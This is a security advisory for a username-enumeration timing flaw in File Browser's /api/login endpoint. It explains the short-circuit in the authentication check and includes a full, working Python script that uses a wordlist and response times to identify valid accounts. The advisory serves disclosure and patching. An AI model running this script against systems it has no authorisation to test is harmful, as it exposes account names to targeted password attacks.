# [M] File Browser Vulnerable to Username Enumeration via Timing Attack in /api/login

## Summary
Severity: Medium
Advisory: GHSA-43mm-m3h2-3prc
CVE: CVE-2026-23849
CWE: CWE-203, CWE-208
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-01-21
Source: https://github.com/advisories/GHSA-43mm-m3h2-3prc
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser` — affected >=0
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.55.0

## Details
### Summary
The JSONAuth.Auth function contains a logic flaw that allows unauthenticated attackers to enumerate valid usernames by measuring the response time of the /api/login endpoint.

### Details
The vulnerability exists due to a "short-circuit" evaluation in the authentication logic. When a username is not found in the database, the function returns immediately. However, if the username does exist, the code proceeds to verify the password using bcrypt (users.CheckPwd), which is a computationally expensive operation designed to be slow.

This difference in execution path creates a measurable timing discrepancy:

Invalid User: ~1ms execution (Database lookup only).
Valid User: ~50ms+ execution (Database lookup + Bcrypt hashing).

In auth/json.go:
```go
// auth/json.go line 54
u, err := usr.Get(srv.Root, cred.Username)
// VULNERABILITY:
// If 'err != nil' (User not found), the OR condition short-circuits.
// The second part (!users.CheckPwd) is NEVER executed.
//
// If 'err == nil' (User found), the code MUST execute users.CheckPwd (Bcrypt).
if err != nil || !users.CheckPwd(cred.Password, u.Password) {
    return nil, os.ErrPermission
}
```
### PoC
The following Python script automates the attack. It first calibrates the network latency using random (non-existent) users to establish a baseline/threshold, and then tests a list of target usernames. Valid users are detected when the response time exceeds the calculated threshold.

```python
import requests
import time
import random
import string
import statistics
import argparse

CALIBRATION_SAMPLES = 20
ENDPOINT = "/api/login"

def generate_random_user(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def measure_response_time(url, username):
    start = time.perf_counter()
    try:
        requests.post(url, json={"username": username, "password": "dummy_pass_123!"})
    except Exception as e:
        print(f"[!] Connection error: {e}")
        return 0
    return time.perf_counter() - start

def calibrate(url):
    print(f"\n[*] Calibrating with {CALIBRATION_SAMPLES} random users...")
    times = []
    
    print("    Progress: ", end="", flush=True)
    for _ in range(CALIBRATION_SAMPLES):
        random_user = generate_random_user()
        elapsed = measure_response_time(url, random_user)
        times.append(elapsed)
        print(".", end="", flush=True)
    print(" OK")
    
    mean = statistics.mean(times)
    try:
        stdev = statistics.stdev(times)
    except:
        stdev = 0.0
    
    threshold = mean + (5 * stdev) + 0.005
    
    print(f"    - Mean time (invalid users): {mean:.4f}s")
    print(f"    - Standard deviation: {stdev:.6f}s")
    print(f"    - Threshold set: {threshold:.4f}s")
    
    return threshold

def load_wordlist(wordlist_path):
    try:
        with open(wordlist_path, 'r', encoding='utf-8') as f:
            users = [line.strip() for line in f if line.strip()]
        return users
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}")
        exit(1)
    except Exception as e:
        print(f"[!] Error reading wordlist: {e}")
        exit(1)

def timing_attack(url, threshold, users):
    print(f"\n[*] Testing {len(users)} users from wordlist...")
    print("-" * 50)
    print(f"{'Username':<15} | {'Time':<10} | {'Status'}")
    print("-" * 50)
    
    found = []
    
    for user in users:
        elapsed = measure_response_time(url, user)
        
        if elapsed > threshold:
            status = ">> VALID <<"
            found.append(user)
        else:
            status = "invalid"
            
        print(f"{user:<15} | {elapsed:.4f}s | {status}")
        
    return found

def main():
    parser = argparse.ArgumentParser(description='FileBrowser timing attack exploit')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://localhost:8080)')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to wordlist file')
    args = parser.parse_args()
    
    target_url = args.url.rstrip('/') + ENDPOINT
    
    print("=== FILEBROWSER TIMING ATTACK ===\n")
    print(f"[*] Target: {target_url}")
    print(f"[*] Wordlist: {args.wordlist}")
    
    try:
        threshold = calibrate(target_url)
        users = load_wordlist(args.wordlist)
        print(f"\n[*] Loaded {len(users)} users from wordlist")
        print("[*] Starting attack...")
        
        valid_users = timing_attack(target_url, threshold, users)
        
        print("\n" + "="*50)
        print(f"SUMMARY: {len(valid_users)} valid users found")
        if valid_users:
            for u in valid_users:
                print(f"  -> {u}")
        print("="*50)
        
    except KeyboardInterrupt:
        print("\n[!] Attack cancelled")

if __name__ == "__main__":
    main()
```

For example, in this case, I have guchihacker as the only valid user in the application.
<img width="842" height="310" alt="image" src="https://github.com/user-attachments/assets/b3caf11e-279c-4532-aa96-fd20cda153a3" />

I am going to use the exploit to list valid users.
<img width="628" height="716" alt="image" src="https://github.com/user-attachments/assets/f9d93e8e-e773-42a5-8a06-bc6bcc2a71fa" />
As we can see, the user guchihacker has been confirmed as a valid user by comparing the server response time.

### Impact
An unauthenticated remote attacker can enumerate valid usernames. This significantly weakens the security posture by facilitating targeted brute-force attacks or credential stuffing against specific, known-valid accounts (e.g., 'admin', 'root', employee names).


I remain at your disposal for any questions you may have on this matter. Thank you very much.

Sincerely, [Felix Sanchez (GUCHI)](https://guchihacker.github.io/)

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-43mm-m3h2-3prc
- https://nvd.nist.gov/vuln/detail/CVE-2026-23849
- https://github.com/filebrowser/filebrowser/commit/24781badd413ee20333aba5cce1919d676e01889
- https://github.com/filebrowser/filebrowser
